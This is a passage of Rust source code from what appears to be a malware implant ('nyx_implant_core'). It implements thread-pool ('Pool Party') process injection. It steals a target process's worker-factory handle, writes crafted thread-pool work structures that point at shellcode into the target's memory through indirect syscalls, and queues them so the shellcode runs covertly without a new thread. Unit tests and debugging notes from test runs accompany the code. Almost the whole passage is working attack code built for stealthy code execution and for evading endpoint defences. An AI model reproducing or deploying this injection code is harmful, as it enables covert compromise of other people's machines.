    Ok((query_wf, set_wf))
}

/// Build the crafted `_TP_DIRECT` + `_TP_WORK` in local buffers. Both structs
/// zero-initialized, then the load-bearing fields are set. Returns
/// (direct_buf, work_buf, direct_offset, work_offset, region_size).
fn threadless_build_structs(
    shellcode_addr: *mut c_void,
) -> (
    [u8; TP_DIRECT_SIZE],
    [u8; TP_WORK_SIZE],
    usize,
    usize,
    usize,
) {
    // Both structs zero-initialized, then the load-bearing fields are set.
    let mut direct_buf = [0u8; TP_DIRECT_SIZE];
    // Callback = shellcode address (in the target's section view).
    direct_buf[TP_DIRECT_CALLBACK_OFFSET..TP_DIRECT_CALLBACK_OFFSET + 8]
        .copy_from_slice(&(shellcode_addr as usize).to_le_bytes());

    let work_buf = [0u8; TP_WORK_SIZE];
    // The `direct` pointer must be the address of the `_TP_DIRECT` *in the
    // target*. We place both structs in one allocated region:
    //   remote_stub = Direct @ +0x00, Work @ +0x40
    // so `direct_addr = remote_stub` and the enqueue feeds
    // `&Work = remote_stub + TP_DIRECT_SIZE`.
    let direct_offset_in_region: usize = 0;
    let work_offset_in_region: usize = TP_DIRECT_SIZE;
    let region_size: usize = TP_DIRECT_SIZE + TP_WORK_SIZE;

    // `direct` field value = address of the `_TP_DIRECT` in the target. We'll
    // patch it once the remote region address is known.
    // (placeholder 0; patched after alloc.)
    (
        direct_buf,
        work_buf,
        direct_offset_in_region,
        work_offset_in_region,
        region_size,
    )
}

/// Allocate an RW stub region in the target via the indirect-syscall wrapper.
/// Returns `(base, allocated_size)` so the caller can protect RX after write.
unsafe fn threadless_alloc_region(
    rt: &nyx_implant_core::syscalls::Runtime,
    target_h: *mut c_void,
    region_size: usize,
) -> Result<(usize, usize), String> {
    let mut remote_base: usize = 0;
    let mut alloc_size: usize = region_size;
    let alloc_status = unsafe {
        nyx_implant_core::syscalls::nt_allocate_virtual_memory(
            rt,
            target_h as usize,
            0, // ZeroBits
            &mut remote_base,
            &mut alloc_size,
            0x3000, // MEM_COMMIT | MEM_RESERVE
            crate::stealth::payload_alloc_protect(),
        )
    };
    match alloc_status {
        Some(s) if s >= 0 => Ok((remote_base, alloc_size)),
        _ => Err(String::from(
            "threadless: NtAllocateVirtualMemory(struct region) failed",
        )),
    }
}

/// RW → RX on the stub region. Fail-closed (do not enqueue with RWX).
unsafe fn threadless_protect_rx(
    rt: &nyx_implant_core::syscalls::Runtime,
    target_h: *mut c_void,
    remote_base: usize,
    alloc_size: usize,
) -> Result<(), String> {
    let mut prot_base = remote_base;
    let mut prot_size = alloc_size;
    let mut old_prot: u32 = 0;
    let st = unsafe {
        nyx_implant_core::syscalls::nt_protect_virtual_memory_process(
            rt,
            target_h as usize,
            &mut prot_base,
            &mut prot_size,
            crate::stealth::desired_final_protect(),
            &mut old_prot,
        )
    };
    match st {
        Some(s) if s >= 0 => Ok(()),
        _ => Err(String::from(
            "threadless: NtProtectVirtualMemory RW→RX failed",
        )),
    }
}

/// Patch the `_TP_WORK.direct` field with the remote `_TP_DIRECT` address.
fn threadless_patch_direct(
    work_buf: &mut [u8; TP_WORK_SIZE],
    remote_base: usize,
    direct_offset_in_region: usize,
) {
    let remote_direct_addr = remote_base + direct_offset_in_region;
    work_buf[TP_WORK_DIRECT_OFFSET..TP_WORK_DIRECT_OFFSET + 8]
        .copy_from_slice(&remote_direct_addr.to_le_bytes());
}

/// Write `_TP_DIRECT` then `_TP_WORK` into the target via the indirect-syscall
/// wrapper.
unsafe fn threadless_write_structs(
    rt: &nyx_implant_core::syscalls::Runtime,
    target_h: *mut c_void,
    remote_base: usize,
    direct_offset_in_region: usize,
    work_offset_in_region: usize,
    direct_buf: &[u8; TP_DIRECT_SIZE],
    work_buf: &[u8; TP_WORK_SIZE],
) -> Result<(), String> {
    let mut written: usize = 0;
    let w1 = unsafe {
        nyx_implant_core::syscalls::nt_write_virtual_memory(
            rt,
            target_h as usize,
            remote_base + direct_offset_in_region,
            direct_buf.as_ptr(),
            TP_DIRECT_SIZE,
            &mut written,
        )
    };
    if w1.map_or(true, |st| st < 0) {
        return Err(String::from("threadless: write _TP_DIRECT failed"));
    }
    let w2 = unsafe {
        nyx_implant_core::syscalls::nt_write_virtual_memory(
            rt,
            target_h as usize,
            remote_base + work_offset_in_region,
            work_buf.as_ptr(),
            TP_WORK_SIZE,
            &mut written,
        )
    };
    if w2.map_or(true, |st| st < 0) {
        return Err(String::from("threadless: write _TP_WORK failed"));
    }
    Ok(())
}

/// Enqueue the crafted `_TP_WORK` via
/// `NtSetInformationWorkerFactory(WorkerFactoryTimeout, &Work)`.
///
/// The SafeBreach variant-2 splice feeds the address of the crafted
/// `_TP_WORK` (in the target) to the worker factory via the
/// `WorkerFactoryTimeout` information class. The factory arms it for the
/// next scheduler pass; the existing `TppWorkerThread` dequeues the work
/// item and invokes `Direct->Callback(Direct)` → shellcode runs in the
/// section view. No remote thread is created.
///
/// NTSTATUS codes: STATUS_SUCCESS (0x00000000) on success;
/// STATUS_INVALID_HANDLE / STATUS_OBJECT_TYPE_MISMATCH if the hijacked
/// handle was not actually a worker factory (shouldn't happen — the probe
/// in hijack_worker_factory already validated it); STATUS_INVALID_PARAMETER
/// if the `_TP_WORK` layout is wrong (suspect offset drift).
unsafe fn threadless_enqueue(
    set_wf: NtSetInformationWorkerFactoryFn,
    worker_factory_h: *mut c_void,
    remote_base: usize,
    work_offset_in_region: usize,
) -> Result<(), String> {
    let remote_work_addr = remote_base + work_offset_in_region;
    let enqueue_st = unsafe {
        set_wf(
            worker_factory_h,
            WORKER_FACTORY_TIMEOUT,
            remote_work_addr as *const c_void,
            core::mem::size_of::<*const c_void>() as u32, // Length = pointer size
        )
    };

    // The hijacked handle is no longer needed after the enqueue — the worker
    // thread owns dispatch from here.
    unsafe { close_handle(worker_factory_h) };

    if enqueue_st >= 0 {
        Ok(())
    } else {
        Err(String::from(
            "threadless: NtSetInformationWorkerFactory(enqueue) rejected (offset drift?)",
        ))
    }
}

// ============================================================================
// hijack_worker_factory — discover + duplicate a worker-factory handle
// ============================================================================

/// `int NtQuerySystemInformation(ULONG, PVOID, ULONG, PULONG)` — raw export
/// (bypasses the trampoline per the single-trampoline rule). 4 args.
type NtQuerySystemInformationFn = unsafe extern "system" fn(
    u32,         // SystemInformationClass
    *mut c_void, // SystemInformation (out)
    u32,         // SystemInformationLength
    *mut u32,    // ReturnLength (opt)
) -> i32;

/// `BOOL DuplicateHandle(HANDLE, HANDLE, HANDLE, HANDLE*, DWORD, BOOL, DWORD)`.
type DuplicateHandleFn = unsafe extern "system" fn(
    *mut c_void,      // hSourceProcessHandle
    *mut c_void,      // hSourceHandle
    *mut c_void,      // hTargetProcessHandle
    *mut *mut c_void, // lpTargetHandle (out)
    u32,              // dwDesiredAccess
    i32,              // bInheritHandle
    u32,              // dwOptions
) -> i32;

/// Discover the target process's thread-pool worker factory by walking the
/// system handle table (`SystemExtendedHandleInformation`), duplicating every
/// handle owned by `target_pid` into the implant with `DUPLICATE_SAME_ACCESS`,
/// and probing each duplicate with `NtQueryInformationWorkerFactory`. The first
/// duplicate that returns `STATUS_SUCCESS` is a worker-factory handle.
///
/// This is the SafeBreach handle-hijack primitive (variant 2): rather than
/// resolve the worker factory via undocumented `ntdll!TppWorkerThread` globals,
/// we steal an existing handle the target already holds. Every process with a
/// default thread pool (i.e. nearly all) holds at least one.
///
/// # Safety
/// `target_h` must grant `PROCESS_DUP_HANDLE`. The duplicated handle is owned
/// by the implant and must be closed (the caller does this). The handle-table
/// buffer is stack/heap scratch — the `ntdll!NtQuerySystemInformation` export
/// pointer is resolved via `resolve::export_addr` (PEB-walk, no library load).
unsafe fn hijack_worker_factory(
    target_h: *mut c_void,
    target_pid: u32,
    query_wf: NtQueryInformationWorkerFactoryFn,
) -> Result<*mut c_void, String> {
    let (qsi, dup_handle) = hijack_resolve_fns()?;

    // Prefer the target's own handle snapshot (SafeBreach HandleHijacker /
    // Teach2Breach ProcessHandleInformation). The system-wide table can miss
    // a brand-new child's factory or fail the size retry on Server 2025.
    let mut proc_candidates = nyx_implant_core::heap::Vec::new();
    if let Some(qip) = hijack_resolve_qip() {
        unsafe { collect_from_process(qip, target_h, &mut proc_candidates) };
    }
    #[cfg(feature = "selftest")]
    {
        let mut s = String::from("proc=");
        s.push_str(&crate::selftests::dec_u32(proc_candidates.len() as u32));
        crate::selftests::write_marker("nyx_g6_pool_scan.proc", &s);
    }
    for handle_val in &proc_candidates {
        if let Ok(dup) = hijack_probe_handle(dup_handle, query_wf, target_h, *handle_val) {
            return Ok(dup);
        }
    }

    let buf = hijack_fetch_table(qsi)?;
    let mut sys_candidates = nyx_implant_core::heap::Vec::new();
    collect_target_handles(&buf, target_pid, &mut sys_candidates);
    #[cfg(feature = "selftest")]
    {
        let mut s = String::from("proc=");
        s.push_str(&crate::selftests::dec_u32(proc_candidates.len() as u32));
        s.push_str(" sys=");
        s.push_str(&crate::selftests::dec_u32(sys_candidates.len() as u32));
        crate::selftests::write_marker("nyx_g6_pool_scan", &s);
    }

    for handle_val in sys_candidates {
        if let Ok(dup) = hijack_probe_handle(dup_handle, query_wf, target_h, handle_val) {
            return Ok(dup);
        }
    }

    Err(String::from(
        "hijack: target has no worker-factory handle (no TP worker?)",
    ))
}

/// Resolve ntdll!NtQuerySystemInformation and kernel32!DuplicateHandle via PEB
/// walk (no library load).
unsafe fn hijack_resolve_fns() -> Result<(NtQuerySystemInformationFn, DuplicateHandleFn), String> {
    let qsi: NtQuerySystemInformationFn = unsafe {
        core::mem::transmute(
            resolve::export_addr(b"ntdll.dll", b"NtQuerySystemInformation")
                .ok_or_else(|| String::from("ntdll!NtQuerySystemInformation missing"))?,
        )
    };
    let dup_handle: DuplicateHandleFn = unsafe {
        core::mem::transmute(
            resolve::export_addr(b"kernel32.dll", b"DuplicateHandle")
                .ok_or_else(|| String::from("kernel32!DuplicateHandle export missing"))?,
        )
    };
    Ok((qsi, dup_handle))
}

type NtQueryInformationProcessFn = unsafe extern "system" fn(
    *mut c_void, // ProcessHandle
    u32,         // ProcessInformationClass
    *mut c_void, // ProcessInformation
    u32,         // ProcessInformationLength
    *mut u32,    // ReturnLength
) -> i32;

unsafe fn hijack_resolve_qip() -> Option<NtQueryInformationProcessFn> {
    let addr = unsafe { resolve::export_addr(b"ntdll.dll", b"NtQueryInformationProcess") }?;
    Some(unsafe { core::mem::transmute(addr) })
}

/// Snapshot the target's handle table via ProcessHandleInformation (51).
unsafe fn collect_from_process(
    qip: NtQueryInformationProcessFn,
    target_h: *mut c_void,
    out: &mut nyx_implant_core::heap::Vec<usize>,
) {
    const STATUS_INFO_LENGTH_MISMATCH: i32 = 0xC000_0004u32 as i32;
    let mut cap: u32 = 0x1_0000;
    for _ in 0..4 {
        let mut buf = nyx_implant_core::heap::vec![0u8; cap as usize];
        let mut ret_len: u32 = 0;
        let st = unsafe {
            qip(
                target_h,
                PROCESS_HANDLE_INFORMATION,
                buf.as_mut_ptr() as *mut c_void,
                cap,
                &mut ret_len,
            )
        };
        if st >= 0 {
            collect_process_handles(&buf, out);
            return;
        }
        if st != STATUS_INFO_LENGTH_MISMATCH {
            return;
        }
        let next = if ret_len > cap {
            ret_len.saturating_add(0x1000)
        } else {
            cap.saturating_mul(2)
        };
        if next > QSI_MAX_CAP || next <= cap {
            return;
        }
        cap = next;
    }
}

/// Walk `PROCESS_HANDLE_SNAPSHOT_INFORMATION` (phnt / SafeBreach Native.hpp):
/// ```text
///   +0x00 ULONG_PTR NumberOfHandles
///   +0x08 ULONG_PTR Reserved
///   +0x10 PROCESS_HANDLE_TABLE_ENTRY_INFO Handles[]  (stride 0x28)
///         +0x00 HANDLE HandleValue
/// ```
fn collect_process_handles(buf: &[u8], out: &mut nyx_implant_core::heap::Vec<usize>) {
    const HANDLES_OFF: usize = 0x10;
    const ENTRY_STRIDE: usize = 0x28;
    if buf.len() < 8 {
        return;
    }
    let count = unsafe { (buf.as_ptr() as *const u64).read_unaligned() };
    let max_entries = buf.len().saturating_sub(HANDLES_OFF) / ENTRY_STRIDE;
    let count = count.min(max_entries as u64) as usize;
    for i in 0..count {
        let entry = HANDLES_OFF + i * ENTRY_STRIDE;
        if entry + 8 > buf.len() {
            break;
        }
        let handle_val =
            unsafe { (buf.as_ptr().add(entry) as *const usize).read_unaligned() };
        if handle_val == 0 || handle_val == (-1isize) as usize {
            continue;
        }
        out.push(handle_val);
    }
}

/// Size the handle table with a length-only query, fetch the full
/// SYSTEM_HANDLE_INFORMATION_EX payload, and retry on
/// STATUS_INFO_LENGTH_MISMATCH with the buffer sized from the kernel's own
/// ReturnLength (never blind doubling).
unsafe fn hijack_fetch_table(
    qsi: NtQuerySystemInformationFn,
) -> Result<nyx_implant_core::heap::Vec<u8>, String> {
    // ---- 1. Size the handle table with a length-only query ----
    let mut needed: u32 = 0;
    let _ = unsafe {
        qsi(
            SYSTEM_EXTENDED_HANDLE_INFORMATION,
            core::ptr::null_mut(),
            0,
            &mut needed,
        )
    };
    if needed == 0 {
        // Fall back to a generous default if the kernel returned 0 (rare).
        needed = 0x10000;
    }
    // Grow the buffer generously — the table can expand between the size query
    // and the content query.
    let cap = needed.saturating_mul(3) / 2 + 0x1000;
    // g6 diagnosis (selftest builds only): Prism returned st=st2=0xC0000004
    // with ret_len 0x239598 — record the size query's `needed` to see whether
    // the emulator fails to fill ReturnLength on the length-only query.
    // 2026-08-24 VM evidence: needed=0x38 (badly under-reported) while the
    // content query demanded ret_len=0x2392c8 — the content query's
    // ReturnLength is the authoritative size, see hijack_fetch_table_payload.
    #[cfg(feature = "selftest")]
    {
        let mut s = String::from("needed=0x");
        s.push_str(&crate::selftests::hex_u32(needed));
        s.push_str(" cap=0x");
        s.push_str(&crate::selftests::hex_u32(cap));
        crate::selftests::write_marker("nyx_g6_pool_qsi.needed", &s);
    }
    let buf = nyx_implant_core::heap::vec![0u8; cap as usize];
    unsafe { hijack_fetch_table_payload(qsi, buf, cap) }
}

/// Upper bounds for the ReturnLength-driven retry: 3 content queries,
/// 32 MiB buffer cap (a real handle table is single-digit MiB; anything
/// larger is a malfunctioning query, not a big table).
const QSI_MAX_ATTEMPTS: u32 = 3;
/// See [`QSI_MAX_ATTEMPTS`].
const QSI_MAX_CAP: u32 = 32 * 1024 * 1024;

/// Fetch the full SYSTEM_HANDLE_INFORMATION_EX payload, resizing from the
/// kernel's own ReturnLength on STATUS_INFO_LENGTH_MISMATCH. The old
/// retry-once-at-2x was blind doubling: under Prism the size query reports
/// `needed=0x38` while the content query demands ret_len=0x2392c8 (VM
/// evidence 2026-08-24, nyx_g6_pool_qsi.*), so 2x of a wrong base never
/// converges. Bounded by [`QSI_MAX_ATTEMPTS`] / [`QSI_MAX_CAP`].
unsafe fn hijack_fetch_table_payload(
    qsi: NtQuerySystemInformationFn,
    mut buf: nyx_implant_core::heap::Vec<u8>,
    mut cap: u32,
) -> Result<nyx_implant_core::heap::Vec<u8>, String> {
    // ---- 2. Fetch the full handle table ----
    let mut st: i32;
    let mut attempt: u32 = 0;
    loop {
        attempt += 1;
        let mut ret_len: u32 = 0;
        st = unsafe {
            qsi(
                SYSTEM_EXTENDED_HANDLE_INFORMATION,
                buf.as_mut_ptr() as *mut c_void,
                cap,
                &mut ret_len,
            )
        };
        if st >= 0 {
            break;
        }
        // STATUS_INFO_LENGTH_MISMATCH (0xC0000004) with a usable ReturnLength:
        // resize to the kernel-reported requirement (+ slack for table growth)
        // and retry. Give up on any other status, a missing/shrinking
        // ReturnLength, an over-cap requirement, or exhausted attempts.
        if st != 0xC0000004u32 as i32
            || attempt >= QSI_MAX_ATTEMPTS
            || ret_len <= cap
            || ret_len > QSI_MAX_CAP
        {
            // g6 diagnosis (selftest builds only): persist the final NTSTATUS,
            // the kernel's ReturnLength, and the attempt count — the static
            // error string alone cannot separate a Prism emulation failure
            // from a sizing bug.
            #[cfg(feature = "selftest")]
            {
                let mut s = String::from("st=0x");
                s.push_str(&crate::selftests::hex_u32(st as u32));
                s.push_str(" ret_len=0x");
                s.push_str(&crate::selftests::hex_u32(ret_len));
                s.push_str(" attempts=");
                s.push_str(&crate::selftests::dec_u32(attempt));
                crate::selftests::write_marker("nyx_g6_pool_qsi.status", &s);
            }
            return Err(String::from("hijack: NtQuerySystemInformation failed"));
        }
        cap = ret_len.saturating_add(0x1_0000).min(QSI_MAX_CAP);
        buf = nyx_implant_core::heap::vec![0u8; cap as usize];
    }
    Ok(buf)
}

/// Duplicate one candidate handle into the implant (DUPLICATE_SAME_ACCESS) and
/// probe it with NtQueryInformationWorkerFactory. Ok(dup) on a worker-factory
/// hit; Err(()) means keep scanning (the duplicate was closed, if any).
unsafe fn hijack_probe_handle(
    dup_handle: DuplicateHandleFn,
    query_wf: NtQueryInformationWorkerFactoryFn,
    target_h: *mut c_void,
    handle_val: usize,
) -> Result<*mut c_void, ()> {
    // GetCurrentProcess pseudo-handle = (HANDLE)-1 (the implant's own process).
    const CUR_PROCESS: *mut c_void = -1isize as *mut c_void;

    // Prefer WORKER_FACTORY_ALL_ACCESS so QUERY/SET are granted (SafeBreach
    // HijackProcessHandle). SAME_ACCESS is the fallback.
    let mut dup: *mut c_void = core::ptr::null_mut();
    let ok_all = unsafe {
        dup_handle(
            target_h,
            handle_val as *mut c_void,
            CUR_PROCESS,
            core::ptr::addr_of_mut!(dup),
            WORKER_FACTORY_ALL_ACCESS,
            0,
            0,
        )
    };
    if ok_all == 0 || dup.is_null() {
        dup = core::ptr::null_mut();
        let ok_same = unsafe {
            dup_handle(
                target_h,
                handle_val as *mut c_void,
                CUR_PROCESS,
                core::ptr::addr_of_mut!(dup),
                0,
                0,
                DUPLICATE_SAME_ACCESS,
            )
        };
        if ok_same == 0 || dup.is_null() {
            return Err(());
        }
    }

    // Probe with WorkerFactoryBasicInformation (7) into a buffer large
    // enough for WORKER_FACTORY_BASIC_INFORMATION. STATUS_SUCCESS ⇒ factory.
    // STATUS_OBJECT_TYPE_MISMATCH (0xC0000024) ⇒ not a factory.
    let mut probe = [0u8; WORKER_FACTORY_BASIC_INFO_BUF];
    let mut probe_len: u32 = 0;
    let qst = unsafe {
        query_wf(
            dup,
            WORKER_FACTORY_BASIC_INFORMATION,
            probe.as_mut_ptr() as *mut c_void,
            probe.len() as u32,
            &mut probe_len,
        )
    };
    if qst >= 0 {
        return Ok(dup);
    }
    // Not a worker factory; close the duplicate and keep scanning.
    unsafe { close_handle(dup) };
    Err(())
}

/// Walk a `SYSTEM_HANDLE_INFORMATION_EX` buffer (the payload returned by
/// `NtQuerySystemInformation(SystemExtendedHandleInformation)`) and collect
/// every `HandleValue` owned by `target_pid` into `out`, skipping null and
/// pseudo (`(HANDLE)-1`) handles. Pure parse — nothing is duplicated or probed
/// here — so it is unit-testable against a synthetic buffer.
///
/// Kernel layout (x64, phnt / Geoff Chappell):
/// ```text
///   +0x00 ULONG_PTR NumberOfHandles           (u64)
///   +0x08 ULONG_PTR Reserved                  (u64)
///   +0x10 SYSTEM_HANDLE_TABLE_ENTRY_INFO_EX Handles[NumberOfHandles]
/// ```
/// Each entry (stride `0x28`):
/// ```text
///   +0x00 PVOID     Object
///   +0x08 ULONG_PTR UniqueProcessId
///   +0x10 ULONG_PTR HandleValue
///   +0x18 ULONG     GrantedAccess
///   +0x1C USHORT    CreatorBackTraceIndex
///   +0x1E USHORT    ObjectTypeIndex
///   +0x20 ULONG     HandleAttributes
///   +0x24 ULONG     Reserved
/// ```
/// Parses at Handles@0x10 first; if that yields 0 hits, retries the legacy
/// Handles@0x08 layout (docs that omitted Reserved). A truncated buffer is a
/// no-op (never panics).
fn collect_target_handles(
    buf: &[u8],
    target_pid: u32,
    out: &mut nyx_implant_core::heap::Vec<usize>,
) {
    collect_target_handles_at(buf, target_pid, out, 0x10);
    if out.is_empty() {
        collect_target_handles_at(buf, target_pid, out, 0x08);
    }
}

fn collect_target_handles_at(
    buf: &[u8],
    target_pid: u32,
    out: &mut nyx_implant_core::heap::Vec<usize>,
    handles_off: usize,
) {
    const COUNT_OFF: usize = 0x00;
    const ENTRY_STRIDE: usize = 0x28;
    const ENTRY_HANDLE_OFF: usize = 0x10;
    const ENTRY_PID_OFF: usize = 0x08;

    if buf.len() < COUNT_OFF + core::mem::size_of::<u64>() {
        return;
    }
    let count = unsafe { (buf.as_ptr().add(COUNT_OFF) as *const u64).read_unaligned() };
    let max_entries = (buf.len().saturating_sub(handles_off)) / ENTRY_STRIDE;
    let count = count.min(max_entries as u64) as usize;

    for i in 0..count {
        let entry = handles_off + i * ENTRY_STRIDE;
        if entry + ENTRY_STRIDE > buf.len() {
            break;
        }
        let pid =
            unsafe { (buf.as_ptr().add(entry + ENTRY_PID_OFF) as *const u64).read_unaligned() };
        if pid != target_pid as u64 {
            continue;
        }
        let handle_val = unsafe {
            (buf.as_ptr().add(entry + ENTRY_HANDLE_OFF) as *const usize).read_unaligned()
        };
        if handle_val == 0 || handle_val == (-1isize) as usize {
            continue;
        }
        out.push(handle_val);
    }
}

/// Close a kernel handle best-effort. Resolves `kernel32!CloseHandle` lazily
/// (once per call — cheap relative to a syscall) and swallows failure: a leaked
/// handle is benign for a single-shot inject and a failure here must not mask
/// the real error from the caller.
///
/// # Safety
/// `h` must be a valid handle owned by the current process (either opened by it
/// or duplicated into it). Closing an unknown handle is a no-op at worst.
unsafe fn close_handle(h: *mut c_void) {
    if h.is_null() {
        return;
    }
    if let Some(addr) = resolve::export_addr(b"kernel32.dll", b"CloseHandle") {
        let close: unsafe extern "system" fn(*mut c_void) -> i32 =
            unsafe { core::mem::transmute(addr) };
        unsafe { close(h) };
    }
}

#[cfg(test)]
mod tests {
    use super::*;

    #[test]
    fn pool_party_default_off() {
        // Unless the build set NYX_POOL_PARTY_ON=1, the gate is OFF.
        assert!(!pool_party_enabled());
    }

    #[test]
    fn gate_round_trips() {
        let prev = set_pool_party_enabled(true);
        assert!(pool_party_enabled());
        set_pool_party_enabled(prev); // restore
    }

    /// The TP_DIRECT_CALLBACK_OFFSET must match the `callback` field offset.
    #[test]
    fn callback_offset_matches_struct() {
        let off = core::mem::offset_of!(TpDirect, callback);
        assert_eq!(off, TP_DIRECT_CALLBACK_OFFSET);
    }

    /// The TP_WORK_DIRECT_OFFSET must match the `direct` field offset — this
    /// is the field the scheduler dereferences to find the `_TP_DIRECT`
    /// (and hence the callback). A drift here breaks the splice silently.
    #[test]
    fn work_direct_offset_matches_struct() {
        let off = core::mem::offset_of!(TpWork, direct);
        assert_eq!(off, TP_WORK_DIRECT_OFFSET);
    }

    /// The structs must be their documented sizes so the raw byte buffers
    /// written across the process boundary match the on-target layout.
    #[test]
    fn tp_struct_sizes_match_layout() {
        assert_eq!(core::mem::size_of::<TpDirect>(), TP_DIRECT_SIZE);
        assert_eq!(core::mem::size_of::<TpWork>(), TP_WORK_SIZE);
    }

    /// The SYSTEM_HANDLE_INFORMATION_EX parse must read the u64 count at 0x00,
    /// skip Reserved at 0x08, start Handles at 0x10, stride 0x28, UniqueProcessId
    /// at +0x08 and HandleValue at +0x10 (x64 phnt layout).
    #[test]
    fn handle_table_parse_matches_x64_layout() {
        const HANDLES_OFF: usize = 0x10;
        const ENTRY_STRIDE: usize = 0x28;
        let mut buf = [0u8; HANDLES_OFF + 3 * ENTRY_STRIDE];
        buf[0..8].copy_from_slice(&3u64.to_le_bytes()); // NumberOfHandles = 3

        // Entry 0: foreign PID (0x100) with handle 0xABC — must be skipped.
        buf[HANDLES_OFF + 0x08..HANDLES_OFF + 0x10].copy_from_slice(&0x100u64.to_le_bytes());
        buf[HANDLES_OFF + 0x10..HANDLES_OFF + 0x18].copy_from_slice(&0xABCu64.to_le_bytes());

        // Entry 1: target PID (0xDEADBEEF) with handle 0x1234 — the hit.
        let e1 = HANDLES_OFF + 1 * ENTRY_STRIDE;
        buf[e1 + 0x08..e1 + 0x10].copy_from_slice(&0xDEADBEEFu64.to_le_bytes());
        buf[e1 + 0x10..e1 + 0x18].copy_from_slice(&0x1234u64.to_le_bytes());

        // Entry 2: target PID but null handle — must be skipped.
        let e2 = HANDLES_OFF + 2 * ENTRY_STRIDE;
        buf[e2 + 0x08..e2 + 0x10].copy_from_slice(&0xDEADBEEFu64.to_le_bytes());
        // HandleValue stays 0.

        let mut out = nyx_implant_core::heap::Vec::new();
        collect_target_handles(&buf, 0xDEADBEEF, &mut out);
        assert_eq!(out.as_slice(), &[0x1234usize]);

        // A truncated buffer (no room for the u64 count, or a partial entry)
        // must be a no-op, never a panic.
        let mut tiny = nyx_implant_core::heap::Vec::new();
        collect_target_handles(&buf[..4], 0xDEADBEEF, &mut tiny);
        assert!(tiny.is_empty());
        collect_target_handles(
            &buf[..HANDLES_OFF + ENTRY_STRIDE / 2],
            0xDEADBEEF,
            &mut tiny,
        );
        assert!(tiny.is_empty());
    }

    /// PROCESS_HANDLE_SNAPSHOT_INFORMATION: count @0, Handles @0x10, stride
    /// 0x28, HandleValue @ +0x00 of each entry (SafeBreach Native.hpp).
    #[test]
    fn process_handle_snapshot_parse() {
        const HANDLES_OFF: usize = 0x10;
        const ENTRY_STRIDE: usize = 0x28;
        let mut buf = [0u8; HANDLES_OFF + 2 * ENTRY_STRIDE];
        buf[0..8].copy_from_slice(&2u64.to_le_bytes());
        buf[HANDLES_OFF..HANDLES_OFF + 8].copy_from_slice(&0x10u64.to_le_bytes());
        let e1 = HANDLES_OFF + ENTRY_STRIDE;
        buf[e1..e1 + 8].copy_from_slice(&0x20u64.to_le_bytes());
        let mut out = nyx_implant_core::heap::Vec::new();
        collect_process_handles(&buf, &mut out);
        assert_eq!(out.as_slice(), &[0x10usize, 0x20usize]);
    }

    /// A buffer laid out with Handles at 0x08 (legacy docs that omitted
    /// Reserved) must still yield the target handle via the 0x08 fallback.
    #[test]
    fn handle_table_parse_falls_back_to_legacy_off() {
        const HANDLES_OFF: usize = 0x08;
        const ENTRY_STRIDE: usize = 0x28;
        let mut buf = [0u8; HANDLES_OFF + ENTRY_STRIDE];
        buf[0..8].copy_from_slice(&1u64.to_le_bytes());
        buf[HANDLES_OFF + 0x08..HANDLES_OFF + 0x10].copy_from_slice(&0xBEEFu64.to_le_bytes());
        buf[HANDLES_OFF + 0x10..HANDLES_OFF + 0x18].copy_from_slice(&0xF00Du64.to_le_bytes());
        let mut out = nyx_implant_core::heap::Vec::new();
        collect_target_handles(&buf, 0xBEEF, &mut out);
        assert_eq!(out.as_slice(), &[0xF00Dusize]);
    }

    #[test]
    fn stub_steady_protect_is_rx_not_rwx() {
        assert_eq!(crate::stealth::desired_final_protect(), 0x20);
        assert_eq!(crate::stealth::payload_alloc_protect(), 0x04);
        assert_ne!(crate::stealth::payload_alloc_protect(), 0x40);
    }

    #[test]
    fn env_skip_matches_worker_factory_and_openprocess() {
        assert!(is_env_skip(
            "hijack: target has no worker-factory handle (no TP worker?)"
        ));
        assert!(is_env_skip("OpenProcess(target) failed gle=5"));
        assert!(!is_env_skip(
            "threadless: NtSetInformationWorkerFactory(enqueue) rejected (offset drift?)"
        ));
    }

    /// The target-handle access mask must include PROCESS_VM_WRITE (0x0020) —
    /// threadless_inject's documented handle contract — or the
    /// `_TP_DIRECT`/`_TP_WORK` writes fail with STATUS_ACCESS_DENIED after
    /// the worker factory is found (2026-08-24 bug B).
    #[test]
    fn target_access_includes_vm_write() {
        const PROCESS_VM_OPERATION: u32 = 0x0008;
        const PROCESS_VM_WRITE: u32 = 0x0020;
        const PROCESS_DUP_HANDLE: u32 = 0x0040;
        const PROCESS_QUERY_INFORMATION: u32 = 0x0400;
        assert_ne!(POOL_PARTY_TARGET_ACCESS & PROCESS_VM_WRITE, 0);
        assert_ne!(POOL_PARTY_TARGET_ACCESS & PROCESS_VM_OPERATION, 0);
        assert_ne!(POOL_PARTY_TARGET_ACCESS & PROCESS_DUP_HANDLE, 0);
        assert_ne!(POOL_PARTY_TARGET_ACCESS & PROCESS_QUERY_INFORMATION, 0);
    }

    /// Simulates the Prism QSI behavior observed on the Win11 ARM64 VM
    /// (2026-08-24, nyx_g6_pool_qsi.*): the length-only query under-reports
    /// (needed=0x38), and every content query with len < the real
    /// requirement fails 0xC0000004 while reporting the REAL size in
    /// ReturnLength. A blind 2x retry never converges from the bogus base;
    /// the ReturnLength-driven resize must.
    unsafe extern "system" fn fake_qsi_underreporting_size_query(
        _class: u32,
        buf: *mut c_void,
        len: u32,
        ret: *mut u32,
    ) -> i32 {
        const REAL_NEEDED: u32 = 0x2392c8;
        const INFO_LENGTH_MISMATCH: i32 = 0xC0000004u32 as i32;
        if buf.is_null() || len == 0 {
            unsafe { *ret = 0x38 };
            return INFO_LENGTH_MISMATCH;
        }
        unsafe { *ret = REAL_NEEDED };
        if len < REAL_NEEDED {
            return INFO_LENGTH_MISMATCH;
        }
        0 // STATUS_SUCCESS once the buffer meets the kernel-reported size
    }

    #[test]
    fn qsi_resize_converges_via_return_length() {
        let buf = unsafe { hijack_fetch_table(fake_qsi_underreporting_size_query) }
            .expect("ReturnLength-driven retry must converge");
        assert!(buf.len() >= 0x2392c8usize);
        assert!(buf.len() <= QSI_MAX_CAP as usize);
    }

    /// Always-mismatching query whose ReturnLength never helps (0): the
    /// retry must give up with Err instead of looping or doubling forever.
    unsafe extern "system" fn fake_qsi_never_converges(
        _class: u32,
        buf: *mut c_void,
        _len: u32,
        ret: *mut u32,
    ) -> i32 {
        if !buf.is_null() {
            unsafe { *ret = 0 };
        }
        0xC0000004u32 as i32
    }

    #[test]
    fn qsi_resize_gives_up_without_usable_return_length() {
        let r = unsafe { hijack_fetch_table(fake_qsi_never_converges) };
        assert!(r.is_err());
    }

    /// A requirement above the 32 MiB cap is a malfunctioning query, not a
    /// real table — must Err rather than allocate unboundedly.
    unsafe extern "system" fn fake_qsi_absurd_size(
